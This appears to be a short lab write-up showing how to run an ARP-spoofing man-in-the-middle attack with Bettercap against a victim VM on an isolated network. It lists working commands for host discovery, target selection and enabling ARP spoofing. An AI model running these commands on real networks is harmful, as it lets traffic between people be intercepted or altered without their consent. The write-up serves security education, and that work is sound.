# MITM Attack — ARP Spoofing with Bettercap

> ⚠️ **Disclaimer:** This was performed in a controlled lab environment for educational purposes only.

---

## What is a MITM Attack?

A Man-in-the-Middle attack occurs when an attacker secretly intercepts communication between two parties. The victims believe they are communicating directly with each other, while the attacker sits in between, reading or modifying the traffic.

---

## Scenario

**Goal:** Demonstrate how ARP Spoofing can be used to intercept traffic on a local network using Bettercap.

**Environment:**
- Attacker Machine: Kali Linux (VM)
- Victim Machine: Ubuntu (VM)
- Network: Isolated lab network

---

## Tools Used

- `ping` — Verify connectivity and discover the target
- `Bettercap` — ARP Spoofing & traffic sniffing

---

## Steps

### 1. Verify Target is Reachable
```bash
ping 192.168.95.140
```
![Ping screenshot]<img width="806" height="502" alt="image" src="https://github.com/user-attachments/assets/827fada1-5d03-4f54-a6cb-325c7c76f366" />


---

### 2. Launch Bettercap
```bash
sudo bettercap -iface eth0
```

---

### 3. Discover Hosts on the Network , Set the Target , Enable ARP Spoofing , Sniff Network Traffic
```bash
net.probe on
```
<img width="1847" height="912" alt="image" src="https://github.com/user-attachments/assets/d2fffcd4-0e13-4210-8116-6753b94562e5" />

```
set arp.spoof.target 192.168.95.140 and arp.spoof on
```
<img width="1372" height="473" alt="image" src="https://github.com/user-attachments/assets/5efe1d9a-3f4d-46e4-b4fb-e300aae7df00" />
